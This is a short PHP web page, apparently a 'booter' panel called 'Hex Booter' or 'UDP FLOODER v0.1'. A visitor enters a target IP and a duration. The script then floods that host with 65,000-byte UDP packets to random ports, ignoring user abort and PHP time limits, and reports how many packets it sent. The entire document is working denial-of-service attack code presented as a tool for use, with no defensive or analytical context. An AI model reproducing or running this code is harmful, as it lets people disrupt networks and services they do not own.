<html>
<head>
Hex Booter
<?php
$ip = $_SERVER['REMOTE_ADDR'];
?>
</head>
<body>
<center>
<font color="red">
<pre>
 +-+-+-+ +-+-+-+-+-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+
 |U|D|P| |P|A|C|K|E|T|S| |F|O|L|D|E|R| |T|O|O|L|S|
 +-+-+-+ +-+-+-+-+-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+
<center><b>Your IP:</b> <font color="red"><?php echo $ip; ?></font> UDP FLOODER v0.1 <br><br></center>
</pre>
<STYLE>
input{
background-color: red; font-size: 8pt; color: white; font-family: Tahoma; border: 1 solid #666666;
}
button{
background-color: #00FF00; font-size: 8pt; color: #000000; font-family: Tahoma; border: 1 solid #666666;
}
body {
background-color: #000000;
}
</style>
<?php
//UDP
if(isset($_GET['host'])&&isset($_GET['time'])){
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);
    
    $exec_time = $_GET['time'];
    
    $time = time();
    //print "Started: ".time('d-m-y h:i:s')."<br>";
    $max_time = $time+$exec_time;
    $host = $_GET['host'];
    
    for($i=0;$i<65000;$i++){
            $out .= 'X';
    }
    while(1){
    $packets++;
            if(time() > $max_time){
                    break;
            }
            $rand = rand(1,65000);
            $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
            if($fp){
                    fwrite($fp, $out);
                    fclose($fp);
            }
    }
    echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
    echo '<br><br>
        <form action="'.$surl.'" method=GET>
        <input type="hidden" name="act" value="phptools">
        IP: <br><input type=text name=host><br>
        Length (seconds): <br><input type=text name=time><br>
        <input type=submit value=Go></form>';
}else{ echo '<br><b>Panel Attack</b><br>
            <form action=? method=GET>
            <input type="hidden" name="act" value="phptools">
            IP: <br><input type=text name=host value=><br>
             (Seconds): <br><input type=text name=time value=><br><br>
            <input type=submit value=Send></form>';
}
?>
</center>
</body>
</html>